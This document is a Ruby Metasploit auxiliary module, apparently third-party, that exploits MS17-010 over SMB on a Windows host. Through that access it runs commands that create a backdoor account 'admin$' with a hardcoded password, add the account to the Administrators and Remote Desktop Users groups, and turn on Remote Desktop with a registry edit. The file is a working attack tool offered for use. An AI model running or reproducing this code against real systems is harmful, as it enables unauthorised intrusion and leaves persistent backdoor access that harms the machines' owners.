##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# auxiliary/admin/smb/ms17_010_command.rb

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SMB::Client::Psexec_MS17_010
  include Msf::Exploit::Remote::SMB::Client::Psexec
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MS17-010 SMB Remote Add user',
      'Description'    => %q{
          This module add admin$ user to administrators group and open remote desktop .
      },

      'Author'        => 'AnonySec',
      'License'        => MSF_LICENSE
    ))

    register_options([
      OptString.new('RPORT', [true, 'The Target port', 445]),
      OptString.new('WINPATH', [true, 'The name of the remote Windows directory', 'WINDOWS']),
    ])

    register_advanced_options([
      OptString.new('FILEPREFIX', [false, 'Add a custom prefix to the temporary files',''])
    ])
  end

  def run_host(ip)
    begin
      if datastore['SMBUser'].present?
        print_status("Authenticating to #{ip} as user '#{splitname(datastore['SMBUser'])}'...")
      end
      eternal_pwn(ip)         # exploit Admin session
      smb_pwn(ip)             # psexec

    rescue ::Msf::Exploit::Remote::SMB::Client::Psexec_MS17_010::MS17_010_Error => e
      print_error("#{e.message}")
    rescue ::Errno::ECONNRESET,
           ::Rex::HostUnreachable,
           ::Rex::Proto::SMB::Exceptions::LoginError,
           ::Rex::ConnectionTimeout,
           ::Rex::ConnectionRefused  => e
      print_error("#{e.class}: #{e.message}")
    rescue => error
      print_error(error.class.to_s)
      print_error(error.message)
      print_error(error.backtrace.join("\n"))
    ensure
      eternal_cleanup()       # restore session
    end
  end

  def smb_pwn(ip)
    text = "\\#{datastore['WINPATH']}\\Temp\\#{datastore['FILEPREFIX']}#{Rex::Text.rand_text_alpha(16)}.txt"
    bat  = "\\#{datastore['WINPATH']}\\Temp\\#{datastore['FILEPREFIX']}#{Rex::Text.rand_text_alpha(16)}.bat"

    # Try and authenticate with given credentials
    user = execute_command(text, bat, "net user admin$ Admin@1qaz /add")
    group = execute_command(text, bat, "net localgroup administrators admin$ /add")
    remote = execute_command(text, bat, "REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f")
    # remote = execute_command(text, bat, "wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1")
    desktop = execute_command(text, bat, 'net localgroup "remote desktop users" admin$ /add')

    print_good("<--- | Remote desktop is enabled, Add User: admin$ with Password: Admin@1qaz | --->")

  end
end